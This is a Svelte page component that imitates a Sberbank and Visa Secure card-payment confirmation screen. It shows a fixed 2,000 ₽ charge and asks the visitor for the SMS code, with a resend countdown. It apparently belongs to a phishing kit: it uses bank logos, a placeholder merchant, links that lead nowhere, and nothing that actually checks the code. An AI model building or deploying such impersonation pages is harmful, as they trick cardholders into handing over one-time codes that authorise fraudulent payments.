<script>
    import { onMount } from "svelte";
    import { t, locale, locales } from "../../languages/i18n";
    import {defineUserLanguage} from '../../helpers/helper';
    import '../../assets/styles/check/check.css';
    let timerValue;
    const dateToday = new Date().toLocaleDateString();
    function timerInit(){
        timerValue = 19;
        const timerId = setInterval(() => {
            if(timerValue > 0)
                timerValue -= 1;
            else clearInterval(timerId);
        }, 1000)
    }
    timerInit();
    
    $: time = new Date().toLocaleDateString($locale, {
        year: "numeric",
        month: "long",
        day: "numeric",
        weekday: "long",
    });
    onMount(()=> { $locale = defineUserLanguage() });
</script>

<svelte:head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>check</title>
</svelte:head>

<section>
    <div class="wraper">
        <p>
            <select bind:value={$locale}>
              {#each locales as l}
                <option value={l}>{l}</option>
              {/each}
            </select>
        </p>
        <div class="logo">
            <img src="/chek/sberbankLogo.png" alt="">
            <img src="/chek/visasecure.png" alt="">
        </div>
        <div class="info">
            <div class="info__price">
                <h1>2 000 ₽</h1>
            </div>
            <div class="info__place">
                <p>{@html $t("check.store")}</p>
                <p>PSP</p>
            </div>
            <div class="info__card">
                <p>{@html $t("check.number")}</p>
                <p>****  </p>
            </div>
            <div class="info__date">
                <p>{@html $t("check.date")}</p>
                <p>
                    {time}
                </p>
            </div>
        </div>
        <div class="text">
            <h2>{@html $t("check.sendCode")}</h2>
            <p>{@html $t("check.sendConditions")}</p>
        </div>
        <div class="input-info">
            <p>{@html $t("check.enterCode")}</p>
            <input name="kod" class="" autocomplete="tel-country-code" pattern="[0-9]*" type="text">
            {#if timerValue > 0}
                <p>{@html $t("check.codeRequest")} <b> {timerValue} {@html $t("check.seconds")}</b></p>
            {:else}
                <button class="getNewCode"
                    on:click={timerInit}>запрос кода</button>
            {/if}
        </div>
        <div class="lock">
            <a href="/">Отменить</a>
            <a href="/">Безопасность</a>
        </div>
    </div>
</section>

<style>
    .getNewCode{
        width: 100%;
        height: 50px;
        margin-top: 8px;
        margin-bottom: 8px;
        border-radius: 4px;
    }
</style>

